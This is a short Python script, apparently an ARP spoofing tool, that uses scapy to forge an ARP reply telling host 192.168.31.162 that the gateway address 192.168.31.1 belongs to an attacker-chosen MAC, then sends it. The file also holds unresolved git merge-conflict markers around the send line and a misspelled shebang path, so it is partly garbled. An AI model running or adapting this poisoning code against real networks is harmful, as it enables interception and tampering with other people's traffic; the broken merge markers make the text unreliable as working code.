# !/user/bin/python3
import scapy.all as scapy

paket = scapy.ARP(
    op=2,
    pdst="192.168.31.162",
    hwsrc="88:78:73:30:1C:95",
    psrc="192.168.31.1")
<<<<<<< HEAD
=======

scapy.send(paket)
>>>>>>> bd80c1bbb0964f2f33cd9269e0bdf99b0b4b4cea
